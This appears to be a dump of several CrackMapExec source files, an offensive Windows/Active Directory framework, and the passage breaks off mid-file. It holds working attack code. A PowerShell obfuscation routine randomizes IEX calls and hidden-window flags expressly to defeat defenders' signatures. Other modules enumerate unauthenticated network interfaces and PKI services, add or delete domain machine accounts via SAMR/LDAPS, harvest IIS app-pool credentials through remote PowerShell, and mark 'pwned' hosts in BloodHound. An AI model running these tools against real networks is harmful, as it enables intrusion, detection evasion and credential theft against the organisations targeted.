""[1,3]+\'x\'-Join\'\')"")\n\n    # Randomly choose from above invoke operation syntaxes.\n    invokeExpression = choice(invoke_expression_syntax)\n\n    # Randomize the case of selected invoke operation.\n    invokeExpression = """".join(choice([i.upper(), i.lower()]) for i in invokeExpression)\n\n    # Choose random Invoke-Expression/IEX syntax and ordering: IEX ($ScriptString) or ($ScriptString | IEX)\n    invokeOptions = [\n        choice(["""", "" ""]) + invokeExpression + choice(["""", "" ""]) + ""("" + choice(["""", "" ""]) + newScript + choice(["""", "" ""]) + "")"" + choice(["""", "" ""]),\n        choice(["""", "" ""]) + newScript + choice(["""", "" ""]) + ""|"" + choice(["""", "" ""]) + invokeExpression,\n    ]\n\n    obfuscated_payload = choice(invokeOptions)\n\n    """"""\n    # Array to store all selected PowerShell execution flags.\n    powerShellFlags = []\n\n    noProfile = \'-nop\'\n    nonInteractive = \'-noni\'\n    windowStyle = \'-w\'\n\n    # Build the PowerShell execution flags by randomly selecting execution flags substrings and randomizing the order.\n    # This is to prevent Blue Team from placing false hope in simple signatures for common substrings of these execution flags.\n    commandlineOptions = []\n    commandlineOptions.append(noProfile[0:randrange(4, len(noProfile) + 1, 1)])\n    commandlineOptions.append(nonInteractive[0:randrange(5, len(nonInteractive) + 1, 1)])\n    # Randomly decide to write WindowStyle value with flag substring or integer value.\n    commandlineOptions.append(\'\'.join(windowStyle[0:randrange(2, len(windowStyle) + 1, 1)] + choice([\' \'*1, \' \'*2, \' \'*3]) + choice([\'1\',\'h\',\'hi\',\'hid\',\'hidd\',\'hidde\'])))\n\n    # Randomize the case of all command-line arguments.\n    for count, option in enumerate(commandlineOptions):\n        commandlineOptions[count] = \'\'.join(choice([i.upper(), i.lower()]) for i in option)\n\n    for count, option in enumerate(commandlineOptions):\n        commandlineOptions[count] = \'\'.join(option)\n\n    commandlineOptions = sample(commandlineOptions, len(commandlineOptions)) \n    commandlineOptions = \'\'.join(i + choice([\' \'*1, \' \'*2, \' \'*3]) for i in commandlineOptions)\n\n    obfuscatedPayload = \'powershell.exe \' + commandlineOptions + newScript\n    """"""\n    return obfuscated_payload\n', 'moduleloader.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport cme\nimport importlib\nimport traceback\nimport sys\n\nfrom os import listdir\nfrom os.path import dirname\nfrom os.path import join as path_join\n\nfrom cme.context import Context\nfrom cme.logger import CMEAdapter\nfrom cme.paths import CME_PATH\n\n\nclass ModuleLoader:\n    def __init__(self, args, db, logger):\n        self.args = args\n        self.db = db\n        self.logger = logger\n\n    def module_is_sane(self, module, module_path):\n        """"""\n        Check if a module has the proper attributes\n        """"""\n        module_error = False\n        if not hasattr(module, ""name""):\n            self.logger.fail(f""{module_path} missing the name variable"")\n            module_error = True\n        elif not hasattr(module, ""description""):\n            self.logger.fail(f""{module_path} missing the description variable"")\n            module_error = True\n        elif not hasattr(module, ""supported_protocols""):\n            self.logger.fail(f""{module_path} missing the supported_protocols variable"")\n            module_error = True\n        elif not hasattr(module, ""opsec_safe""):\n            self.logger.fail(f""{module_path} missing the opsec_safe variable"")\n            module_error = True\n        elif not hasattr(module, ""multiple_hosts""):\n            self.logger.fail(f""{module_path} missing the multiple_hosts variable"")\n            module_error = True\n        elif not hasattr(module, ""options""):\n            self.logger.fail(f""{module_path} missing the options function"")\n            module_error = True\n        elif not hasattr(module, ""on_login"") and not (module, ""on_admin_login""):\n            self.logger.fail(f""{module_path} missing the on_login/on_admin_login function(s)"")\n            module_error = True\n        # elif not hasattr(module, \'chain_support\'):\n        #    self.logger.fail(\'{} missing the chain_support variable\'.format(module_path))\n        #    module_error = True\n\n        if module_error:\n            return False\n        return True\n\n    def load_module(self, module_path):\n        """"""\n        Load a module, initializing it and checking that it has the proper attributes\n        """"""\n        try:\n            spec = importlib.util.spec_from_file_location(""CMEModule"", module_path)\n            module = spec.loader.load_module().CMEModule()\n\n            if self.module_is_sane(module, module_path):\n                return module\n        except Exception as e:\n            self.logger.fail(f""Failed loading module at {module_path}: {e}"")\n            self.logger.debug(traceback.format_exc())\n        return None\n\n    def init_module(self, module_path):\n        """"""\n        Initialize a module for execution\n        """"""\n        module = None\n        module = self.load_module(module_path)\n\n        if module:\n            self.logger.debug(f""Supported protocols: {module.supported_protocols}"")\n            self.logger.debug(f""Protocol: {self.args.protocol}"")\n            if self.args.protocol in module.supported_protocols:\n                try:\n                    module_logger = CMEAdapter(extra={""module_name"": module.name.upper()})\n                except Exception as e:\n                    self.logger.fail(f""Error loading CMEAdaptor for module {module.name.upper()}: {e}"")\n                context = Context(self.db, module_logger, self.args)\n                module_options = {}\n\n                for option in self.args.module_options:\n                    key, value = option.split(""="", 1)\n                    module_options[str(key).upper()] = value\n\n                module.options(context, module_options)\n                return module\n            else:\n                self.logger.fail(f""Module {module.name.upper()} is not supported for protocol {self.args.protocol}"")\n                sys.exit(1)\n\n    def get_module_info(self, module_path):\n        """"""\n        Get the path, description, and options from a module\n        """"""\n        try:\n            spec = importlib.util.spec_from_file_location(""CMEModule"", module_path)\n            module_spec = spec.loader.load_module().CMEModule\n\n            module = {\n                f""{module_spec.name.lower()}"": {\n                    ""path"": module_path,\n                    ""description"": module_spec.description,\n                    ""options"": module_spec.options.__doc__,\n                    ""supported_protocols"": module_spec.supported_protocols,\n                    ""opsec_safe"": module_spec.opsec_safe,\n                    ""multiple_hosts"": module_spec.multiple_hosts,\n                }\n            }\n            if self.module_is_sane(module_spec, module_path):\n                return module\n        except Exception as e:\n            self.logger.fail(f""Failed loading module at {module_path}: {e}"")\n            self.logger.debug(traceback.format_exc())\n        return None\n\n    def list_modules(self):\n        """"""\n        List modules without initializing them\n        """"""\n        modules = {}\n        modules_paths = [\n            path_join(dirname(cme.__file__), ""modules""),\n            path_join(CME_PATH, ""modules""),\n        ]\n\n        for path in modules_paths:\n            for module in listdir(path):\n                if module[-3:] == "".py"" and module != ""example_module.py"":\n                    try:\n                        module_path = path_join(path, module)\n                        module_data = self.get_module_info(module_path)\n                        modules.update(module_data)\n                    except:\n                        pass\n        return modules\n', 'protocolloader.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom types import ModuleType\nfrom importlib.machinery import SourceFileLoader\nfrom os import listdir\nfrom os.path import join as path_join\nfrom os.path import dirname, exists, expanduser\nimport cme\n\n\nclass ProtocolLoader:\n    def __init__(self):\n        self.cme_path = expanduser(""~/.cme"")\n\n    def load_protocol(self, protocol_path):\n        loader = SourceFileLoader(""protocol"", protocol_path)\n        protocol = ModuleType(loader.name)\n        loader.exec_module(protocol)\n        return protocol\n\n    def get_protocols(self):\n        protocols = {}\n        protocol_paths = [\n            path_join(dirname(cme.__file__), ""protocols""),\n            path_join(self.cme_path, ""protocols""),\n        ]\n\n        for path in protocol_paths:\n            for protocol in listdir(path):\n                if protocol[-3:] == "".py"" and protocol[:-3] != ""__init__"":\n                    protocol_path = path_join(path, protocol)\n                    protocol_name = protocol[:-3]\n\n                    protocols[protocol_name] = {""path"": protocol_path}\n\n                    db_file_path = path_join(path, protocol_name, ""database.py"")\n                    db_nav_path = path_join(path, protocol_name, ""db_navigator.py"")\n                    protocol_args_path = path_join(path, protocol_name, ""proto_args.py"")\n                    if exists(db_file_path):\n                        protocols[protocol_name][""dbpath""] = db_file_path\n                    if exists(db_nav_path):\n                        protocols[protocol_name][""nvpath""] = db_nav_path\n                    if exists(protocol_args_path):\n                        protocols[protocol_name][""argspath""] = protocol_args_path\n\n        return protocols\n', 'IOXIDResolver.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# Credit to https://airbus-cyber-security.com/fr/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/\n# Airbus CERT\n# module by @mpgn_x64\n\nfrom ipaddress import ip_address\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE\nfrom impacket.dcerpc.v5.dcomrt import IObjectExporter\n\n\nclass CMEModule:\n    name = ""ioxidresolver""\n    description = ""This module helps you to identify hosts that have additional active interfaces""\n    supported_protocols = [""smb"", ""wmi""]\n    opsec_safe = True\n    multiple_hosts = False\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_login(self, context, connection):\n        authLevel = RPC_C_AUTHN_LEVEL_NONE\n\n        stringBinding = r""ncacn_ip_tcp:%s"" % connection.host\n        rpctransport = transport.DCERPCTransportFactory(stringBinding)\n\n        portmap = rpctransport.get_dce_rpc()\n        portmap.set_auth_level(authLevel)\n        portmap.connect()\n\n        objExporter = IObjectExporter(portmap)\n        bindings = objExporter.ServerAlive2()\n\n        context.log.debug(""[*] Retrieving network interface of "" + connection.host)\n\n        # NetworkAddr = bindings[0][\'aNetworkAddr\']\n        for binding in bindings:\n            NetworkAddr = binding[""aNetworkAddr""]\n            try:\n                ip_address(NetworkAddr[:-1])\n                context.log.highlight(""Address: "" + NetworkAddr)\n            except Exception as e:\n                context.log.debug(e)\n', 'MachineAccountQuota.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n\nclass CMEModule:\n    """"""\n    Module by Shutdown and Podalirius\n\n    Initial module:\n      https://github.com/ShutdownRepo/CrackMapExec-MachineAccountQuota\n\n    Authors:\n      Shutdown: @_nwodtuhs\n      Podalirius: @podalirius_\n    """"""\n\n    def options(self, context, module_options):\n        pass\n\n    name = ""MAQ""\n    description = ""Retrieves the MachineAccountQuota domain-level attribute""\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = False\n\n    def on_login(self, context, connection):\n        result = []\n        context.log.display(""Getting the MachineAccountQuota"")\n        searchFilter = ""(objectClass=*)""\n        attributes = [""ms-DS-MachineAccountQuota""]\n        result = connection.search(searchFilter, attributes)\n        context.log.highlight(""MachineAccountQuota: %d"" % result[0][""attributes""][0][""vals""][0])\n', 'adcs.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport re\nfrom impacket.ldap import ldap, ldapasn1\nfrom impacket.ldap.ldap import LDAPSearchError\n\n\nclass CMEModule:\n    """"""\n    Find PKI Enrollment Services in Active Directory and Certificate Templates Names.\n\n    Module by Tobias Neitzel (@qtc_de) and Sam Freeside (@snovvcrash)\n    """"""\n\n    name = ""adcs""\n    description = ""Find PKI Enrollment Services in Active Directory and Certificate Templates Names""\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.server = None\n        self.regex = None\n\n    def options(self, context, module_options):\n        """"""\n        SERVER             PKI Enrollment Server to enumerate templates for. Default is None, use CN name\n        BASE_DN            The base domain name for the LDAP query\n        """"""\n        self.context = context\n        self.regex = re.compile(""(https?://.+)"")\n\n        self.server = None\n        self.base_dn = None\n        if module_options and ""SERVER"" in module_options:\n            self.server = module_options[""SERVER""]\n        if module_options and ""BASE_DN"" in module_options:\n            self.base_dn = module_options[""BASE_DN""]\n\n    def on_login(self, context, connection):\n        """"""\n        On a successful LDAP login we perform a search for all PKI Enrollment Server or Certificate Templates Names.\n        """"""\n        if self.server is None:\n            search_filter = ""(objectClass=pKIEnrollmentService)""\n        else:\n            search_filter = f""(distinguishedName=CN={self.server},CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,""\n            self.context.log.highlight(""Using PKI CN: {}"".format(self.server))\n\n        context.log.display(""Starting LDAP search with search filter \'{}\'"".format(search_filter))\n\n        try:\n            sc = ldap.SimplePagedResultsControl()\n            base_dn_root = connection.ldapConnection._baseDN if self.base_dn is None else self.base_dn\n\n            if self.server is None:\n                resp = connection.ldapConnection.search(\n                    searchFilter=search_filter,\n                    attributes=[],\n                    sizeLimit=0,\n                    searchControls=[sc],\n                    perRecordCallback=self.process_servers,\n                    searchBase=""CN=Configuration,"" + base_dn_root,\n                )\n            else:\n                resp = connection.ldapConnection.search(\n                    searchFilter=search_filter + base_dn_root + "")"",\n                    attributes=[""certificateTemplates""],\n                    sizeLimit=0,\n                    searchControls=[sc],\n                    perRecordCallback=self.process_templates,\n                    searchBase=""CN=Configuration,"" + base_dn_root,\n                )\n        except LDAPSearchError as e:\n            context.log.fail(""Obtained unexpected exception: {}"".format(str(e)))\n\n    def process_servers(self, item):\n        """"""\n        Function that is called to process the items obtain by the LDAP search when listing PKI Enrollment Servers.\n        """"""\n        if not isinstance(item, ldapasn1.SearchResultEntry):\n            return\n\n        urls = []\n        host_name = None\n        cn = None\n\n        try:\n            for attribute in item[""attributes""]:\n                if str(attribute[""type""]) == ""dNSHostName"":\n                    host_name = attribute[""vals""][0].asOctets().decode(""utf-8"")\n                if str(attribute[""type""]) == ""cn"":\n                    cn = attribute[""vals""][0].asOctets().decode(""utf-8"")\n                elif str(attribute[""type""]) == ""msPKI-Enrollment-Servers"":\n                    values = attribute[""vals""]\n\n                    for value in values:\n                        value = value.asOctets().decode(""utf-8"")\n                        match = self.regex.search(value)\n                        if match:\n                            urls.append(match.group(1))\n        except Exception as e:\n            entry = host_name or ""item""\n            self.context.log.fail(""Skipping {}, cannot process LDAP entry due to error: \'{}\'"".format(entry, str(e)))\n\n        if host_name:\n            self.context.log.highlight(""Found PKI Enrollment Server: {}"".format(host_name))\n        if cn:\n            self.context.log.highlight(""Found CN: {}"".format(cn))\n        for url in urls:\n            self.context.log.highlight(""Found PKI Enrollment WebService: {}"".format(url))\n\n    def process_templates(self, item):\n        """"""\n        Function that is called to process the items obtain by the LDAP search when listing Certificate Templates Names for a specific PKI Enrollment Server.\n        """"""\n        if not isinstance(item, ldapasn1.SearchResultEntry):\n            return\n\n        templates = []\n        template_name = None\n\n        try:\n            for attribute in item[""attributes""]:\n                if str(attribute[""type""]) == ""certificateTemplates"":\n                    for val in attribute[""vals""]:\n                        template_name = val.asOctets().decode(""utf-8"")\n                        templates.append(template_name)\n        except Exception as e:\n            entry = template_name or ""item""\n            self.context.log.fail(f""Skipping {entry}, cannot process LDAP entry due to error: \'{e}\'"")\n\n        if templates:\n            for t in templates:\n                self.context.log.highlight(""Found Certificate Template: {}"".format(t))\n', 'add_computer.py': '#!/usr/bin/env python3\n\n# -*- coding: utf-8 -*-\n\nimport ldap3\nfrom impacket.dcerpc.v5 import samr, epm, transport\n\nclass CMEModule:\n    \'\'\'\n    Module by CyberCelt: @Cyb3rC3lt\n     Initial module:\n        https://github.com/Cyb3rC3lt/CrackMapExec-Modules\n    Thanks to the guys at impacket for the original code\n    \'\'\'\n\n    name = \'add-computer\'\n    description = \'Adds or deletes a domain computer\'\n    supported_protocols = [\'smb\']\n    opsec_safe = True\n    multiple_hosts = False\n\n    def options(self, context, module_options):\n        \'\'\'\n        add-computer: Specify add-computer to call the module using smb\n        NAME: Specify the NAME option to name the Computer to be added\n        PASSWORD: Specify the PASSWORD option to supply a password for the Computer to be added\n        DELETE: Specify DELETE to remove a Computer\n        CHANGEPW: Specify CHANGEPW to modify a Computer password\n        Usage: cme smb $DC-IP -u Username -p Password -M add-computer -o NAME=""BADPC"" PASSWORD=""Password1""\n               cme smb $DC-IP -u Username -p Password -M add-computer -o NAME=""BADPC"" DELETE=True\n               cme smb $DC-IP -u Username -p Password -M add-computer -o NAME=""BADPC"" PASSWORD=""Password2"" CHANGEPW=True\n        \'\'\'\n\n        self.__baseDN = None\n        self.__computerGroup = None\n        self.__method = ""SAMR""\n        self.__noAdd = False\n        self.__delete = False\n        self.noLDAPRequired = False\n\n        if \'DELETE\' in module_options:\n            self.__delete = True\n\n        if \'CHANGEPW\' in module_options and (\'NAME\' not in module_options or \'PASSWORD\' not in module_options):\n            context.log.error(\'NAME  and PASSWORD options are required!\')\n        elif \'CHANGEPW\' in module_options:\n                self.__noAdd = True\n\n        if \'NAME\' in module_options:\n            self.__computerName = module_options[\'NAME\']\n            if self.__computerName[-1] != \'$\':\n                self.__computerName += \'$\'\n        else:\n            context.log.error(\'NAME option is required!\')\n            exit(1)\n\n        if \'PASSWORD\' in module_options:\n            self.__computerPassword = module_options[\'PASSWORD\']\n        elif \'PASSWORD\' not in module_options and not self.__delete:\n            context.log.error(\'PASSWORD option is required!\')\n            exit(1)\n\n    def on_login(self, context, connection):\n\n        #Set some variables\n        self.__domain = connection.domain\n        self.__domainNetbios = connection.domain\n        self.__kdcHost = connection.hostname + ""."" + connection.domain\n        self.__target = self.__kdcHost\n        self.__username = connection.username\n        self.__password = connection.password\n        self.__targetIp = connection.host\n        self.__port = context.smb_server_port\n        self.__aesKey = context.aesKey\n        self.__hashes = context.hash\n        self.__doKerberos = connection.kerberos\n        self.__nthash = """"\n        self.__lmhash = """"\n\n        if context.hash and "":"" in context.hash[0]:\n            hashList = context.hash[0].split("":"")\n            self.__nthash = hashList[-1]\n            self.__lmhash = hashList[0]\n        elif context.hash and "":"" not in context.hash[0]:\n            self.__nthash = context.hash[0]\n            self.__lmhash = ""00000000000000000000000000000000""\n\n        # First try to add via SAMR over SMB\n        self.doSAMRAdd(context)\n\n        # If SAMR fails now try over LDAPS\n        if not self.noLDAPRequired:\n         self.doLDAPSAdd(connection,context)\n        else:\n            exit(1)\n\n    def doSAMRAdd(self,context):\n\n        if self.__targetIp is not None:\n            stringBinding = epm.hept_map(self.__targetIp, samr.MSRPC_UUID_SAMR, protocol = \'ncacn_np\')\n        else:\n            stringBinding = epm.hept_map(self.__target, samr.MSRPC_UUID_SAMR, protocol = \'ncacn_np\')\n        rpctransport = transport.DCERPCTransportFactory(stringBinding)\n        rpctransport.set_dport(self.__port)\n\n        if self.__targetIp is not None:\n            rpctransport.setRemoteHost(self.__targetIp)\n            rpctransport.setRemoteName(self.__target)\n\n        if hasattr(rpctransport, \'set_credentials\'):\n            # This method exists only for selected protocol sequences.\n            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,\n                                         self.__nthash, self.__aesKey)\n\n        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)\n\n        dce = rpctransport.get_dce_rpc()\n        servHandle = None\n        domainHandle = None\n        userHandle = None\n        try:\n            dce.connect()\n            dce.bind(samr.MSRPC_UUID_SAMR)\n\n            samrConnectResponse = samr.hSamrConnect5(dce, \'\\\\\\\\%s\\x00\' % self.__target,\n                samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN )\n            servHandle = samrConnectResponse[\'ServerHandle\']\n\n            samrEnumResponse = samr.hSamrEnumerateDomainsInSamServer(dce, servHandle)\n            domains = samrEnumResponse[\'Buffer\'][\'Buffer\']\n            domainsWithoutBuiltin = list(filter(lambda x : x[\'Name\'].lower() != \'builtin\', domains))\n\n            if len(domainsWithoutBuiltin) > 1:\n                domain = list(filter(lambda x : x[\'Name\'].lower() == self.__domainNetbios, domains))\n                if len(domain) != 1:\n                    context.log.highlight(u\'{}\'.format(\n                        \'This domain does not exist: ""\' + self.__domainNetbios + \'""\'))\n                    logging.critical(""Available domain(s):"")\n                    for domain in domains:\n                        logging.error("" * %s"" % domain[\'Name\'])\n                    raise Exception()\n                else:\n                    selectedDomain = domain[0][\'Name\']\n            else:\n                selectedDomain = domainsWithoutBuiltin[0][\'Name\']\n\n            samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(dce, servHandle, selectedDomain)\n            domainSID = samrLookupDomainResponse[\'DomainId\']\n\n            if logging.getLogger().level == logging.DEBUG:\n                logging.info(""Opening domain %s..."" % selectedDomain)\n            samrOpenDomainResponse = samr.hSamrOpenDomain(dce, servHandle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER , domainSID)\n            domainHandle = samrOpenDomainResponse[\'DomainHandle\']\n\n            if self.__noAdd or self.__delete:\n                try:\n                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])\n                except samr.DCERPCSessionError as e:\n                    if e.error_code == 0xc0000073:\n                        context.log.highlight(u\'{}\'.format(\n                            self.__computerName + \' not found in domain \' + selectedDomain))\n                        self.noLDAPRequired = True\n                        raise Exception()\n                    else:\n                        raise\n\n                userRID = checkForUser[\'RelativeIds\'][\'Element\'][0]\n                if self.__delete:\n                    access = samr.DELETE\n                    message = ""delete""\n                else:\n                    access = samr.USER_FORCE_PASSWORD_CHANGE\n                    message = ""set the password for""\n                try:\n                    openUser = samr.hSamrOpenUser(dce, domainHandle, access, userRID)\n                    userHandle = openUser[\'UserHandle\']\n                except samr.DCERPCSessionError as e:\n                    if e.error_code == 0xc0000022:\n                        context.log.highlight(u\'{}\'.format(\n                            self.__username + \' does not have the right to \' + message + "" "" + self.__computerName))\n                        self.noLDAPRequired = True\n                        raise Exception()\n                    else:\n                        raise\n            else:\n                if self.__computerName is not None:\n                    try:\n                        checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])\n                        self.noLDAPRequired = True\n                        context.log.highlight(u\'{}\'.format(\n                            \'Computer account already exists with the name: ""\' + self.__computerName + \'""\'))\n                        raise Exception()\n                    except samr.DCERPCSessionError as e:\n                        if e.error_code != 0xc0000073:\n                            raise\n                else:\n                    foundUnused = False\n                    while not foundUnused:\n                        self.__computerName = self.generateComputerName()\n                        try:\n                            checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])\n                        except samr.DCERPCSessionError as e:\n                            if e.error_code == 0xc0000073:\n                                foundUnused = True\n                            else:\n                                raise\n                try:\n                    createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)\n                    self.noLDAPRequired = True\n                    context.log.highlight(\'Successfully added the machine account: ""\' + self.__computerName + \'"" with Password: ""\' + self.__computerPassword + \'""\')\n                except samr.DCERPCSessionError as e:\n                    if e.error_code == 0xc0000022:\n                        context.log.highlight(u\'{}\'.format(\n                            \'The following user does not have the right to create a computer account: ""\' + self.__username + \'""\'))\n                        raise Exception()\n                    elif e.error_code == 0xc00002e7:\n                        context.log.highlight(u\'{}\'.format(\n                            \'The following user exceeded their machine account quota: ""\' + self.__username + \'""\'))\n                        raise Exception()\n                    else:\n                        raise\n                userHandle = createUser[\'UserHandle\']\n\n            if self.__delete:\n                samr.hSamrDeleteUser(dce, userHandle)\n                context.log.highlight(u\'{}\'.format(\'Successfully deleted the ""\' + self.__computerName + \'"" Computer account\'))\n                self.noLDAPRequired=True\n                userHandle = None\n            else:\n                samr.hSamrSetPasswordInternal4New(dce, userHandle, self.__computerPassword)\n                if self.__noAdd:\n                    context.log.highlight(u\'{}\'.format(\n                        \'Successfully set the password of machine ""\' + self.__computerName + \'"" with password ""\' + self.__computerPassword + \'""\'))\n                    self.noLDAPRequired=True\n                else:\n                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])\n                    userRID = checkForUser[\'RelativeIds\'][\'Element\'][0]\n                    openUser = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, userRID)\n                    userHandle = openUser[\'UserHandle\']\n                    req = samr.SAMPR_USER_INFO_BUFFER()\n                    req[\'tag\'] = samr.USER_INFORMATION_CLASS.UserControlInformation\n                    req[\'Control\'][\'UserAccountControl\'] = samr.USER_WORKSTATION_TRUST_ACCOUNT\n                    samr.hSamrSetInformationUser2(dce, userHandle, req)\n                    if not self.noLDAPRequired:\n                       context.log.highlight(u\'{}\'.format(\n                        \'Successfully added the machine account ""\' + self.__computerName + \'"" with Password: ""\' + self.__computerPassword + \'""\'))\n                    self.noLDAPRequired = True\n\n        except Exception as e:\n            if logging.getLogger().level == logging.DEBUG:\n                import traceback\n                traceback.print_exc()\n        finally:\n            if userHandle is not None:\n                samr.hSamrCloseHandle(dce, userHandle)\n            if domainHandle is not None:\n                samr.hSamrCloseHandle(dce, domainHandle)\n            if servHandle is not None:\n                samr.hSamrCloseHandle(dce, servHandle)\n            dce.disconnect()\n\n    def doLDAPSAdd(self, connection, context):\n        ldap_domain = connection.domain.replace(""."", "",dc="")\n        spns = [\n            \'HOST/%s\' % self.__computerName,\n            \'HOST/%s.%s\' % (self.__computerName, connection.domain),\n            \'RestrictedKrbHost/%s\' % self.__computerName,\n            \'RestrictedKrbHost/%s.%s\' % (self.__computerName, connection.domain),\n        ]\n        ucd = {\n            \'dnsHostName\': \'%s.%s\' % (self.__computerName, connection.domain),\n            \'userAccountControl\': 0x1000,\n            \'servicePrincipalName\': spns,\n            \'sAMAccountName\': self.__computerName,\n            \'unicodePwd\': (\'""%s""\' % self.__computerPassword).encode(\'utf-16-le\')\n        }\n        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2, ciphers=\'ALL:@SECLEVEL=0\')\n        ldapServer = ldap3.Server(connection.host, use_ssl=True, port=636, get_info=ldap3.ALL, tls=tls)\n        c = Connection(ldapServer, connection.username + \'@\' + connection.domain, connection.password)\n        c.bind()\n\n        if (self.__delete):\n            result = c.delete(""cn="" + self.__computerName + "",cn=Computers,dc="" + ldap_domain)\n            if result:\n                context.log.highlight(u\'{}\'.format(\'Successfully deleted the ""\' + self.__computerName + \'"" Computer account\'))\n            elif result == False and c.last_error == ""noSuchObject"":\n                context.log.highlight(u\'{}\'.format(\'Computer named ""\' + self.__computerName + \'"" was not found\'))\n            elif result == False and c.last_error == ""insufficientAccessRights"":\n                context.log.highlight(\n                    u\'{}\'.format(\'Insufficient Access Rights to delete the Computer ""\' + self.__computerName + \'""\'))\n            else:\n                context.log.highlight(u\'{}\'.format(\n                    \'Unable to delete the ""\' + self.__computerName + \'"" Computer account. The error was: \' + c.last_error))\n        else:\n            result = c.add(""cn="" + self.__computerName + "",cn=Computers,dc="" + ldap_domain,\n                           [\'top\', \'person\', \'organizationalPerson\', \'user\', \'computer\'], ucd)\n            if result:\n                context.log.highlight(\'Successfully added the machine account: ""\' + self.__computerName + \'"" with Password: ""\' + self.__computerPassword + \'""\')\n                context.log.highlight(u\'{}\'.format(\'You can try to verify this with the CME command:\'))\n                context.log.highlight(u\'{}\'.format(\n                    \'cme ldap \' + connection.host + \' -u \' + connection.username + \' -p \' + connection.password + \' -M group-mem -o GROUP=""Domain Computers""\'))\n            elif result == False and c.last_error == ""entryAlreadyExists"":\n                context.log.highlight(u\'{}\'.format(\'The Computer account ""\' + self.__computerName + \'"" already exists\'))\n            elif not result:\n                context.log.highlight(u\'{}\'.format(\n                    \'Unable to add the ""\' + self.__computerName + \'"" Computer account. The error was: \' + c.last_error))\n        c.unbind()\n', 'appcmd.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nclass CMEModule:\n\n    """"""\n    Checks for credentials in IIS Application Pool configuration files using appcmd.exe.\n\n    Module by Brandon Fisher @shad0wcntr0ller\n    """"""\n\n    name = \'iis\'\n    description = ""Checks for credentials in IIS Application Pool configuration files using appcmd.exe""\n    supported_protocols = [\'smb\']\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self):\n        pass\n\n    def options(self, context, module_options):\n        pass\n\n    def on_admin_login(self, context, connection):\n        self.check_appcmd(context, connection)\n\n    def check_appcmd(self, context, connection):\n        \n        if not hasattr(connection, \'has_run\'):\n            connection.has_run = False\n\n        \n        if connection.has_run:\n            return\n\n        connection.has_run = True\n\n        \n        try:\n            connection.conn.listPath(\'C$\', \'\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe\')\n            self.execute_appcmd(context, connection)\n        except:\n            context.log.fail(""appcmd.exe not found, this module is not applicable."")\n            return\n\n    def execute_appcmd(self, context, connection):\n        command = f\'powershell -c ""C:\\\\windows\\\\system32\\\\inetsrv\\\\appcmd.exe list apppool /@t:*""\'\n        context.log.info(f\'Checking For Hidden Credentials With Appcmd.exe\')\n        output = connection.execute(command, True)\n        \n        lines = output.splitlines()\n        username = None\n        password = None\n        apppool_name = None\n\n        credentials_set = set()\n\n        for line in lines:\n            if \'APPPOOL.NAME:\' in line:\n                apppool_name = line.split(\'APPPOOL.NAME:\')[1].strip().strip(\'""\')\n            if ""userName:"" in line:\n                username = line.split(""userName:"")[1].strip().strip(\'""\')\n            if ""password:"" in line:\n                password = line.split(""password:"")[1].strip().strip(\'""\')\n\n            \n            if apppool_name and username is not None and password is not None:  \n                current_credentials = (apppool_name, username, password)\n\n                if current_credentials not in credentials_set:\n                    credentials_set.add(current_credentials)\n                    \n                    if username:\n                        context.log.success(f""Credentials Found for APPPOOL: {apppool_name}"")\n                        if password == """":\n                            context.log.highlight(f""Username: {username} - User Does Not Have A Password"")\n                        else:\n                            context.log.highlight(f""Username: {username}, Password: {password}"")\n\n                \n                username = None\n                password = None\n                apppool_name = None\n\n        if not credentials_set:\n            context.log.fail(""No credentials found :("")\n', 'bh_owned.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Author:\n#  Romain Bentz (pixis - @hackanddo)\n# Website:\n#  https://beta.hackndo.com [FR]\n#  https://en.hackndo.com [EN]\n\nimport sys\nfrom neo4j import GraphDatabase\nfrom neo4j.exceptions import AuthError, ServiceUnavailable\n\n\nclass CMEModule:\n    name = ""bh_owned""\n    description = ""Set pwned computer as owned in Bloodhound""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.neo4j_pass = None\n        self.neo4j_user = None\n        self.neo4j_Port = None\n        self.neo4j_URI = None\n\n    def options(self, context, module_options):\n        """"""\n        URI            URI for Neo4j database (default: 127.0.0.1)\n        PORT           Listening port for Neo4j database (default: 7687)\n        USER           Username for Neo4j database (default: \'neo4j\')\n        PASS           Password for Neo4j database (default: \'neo4j\')\n        """"""\n\n        self.neo4j_URI = ""127.0.0.1""\n        self.neo4j_Port = ""7687""\n        self.neo4j_user = ""neo4j""\n        self.neo4j_pass = 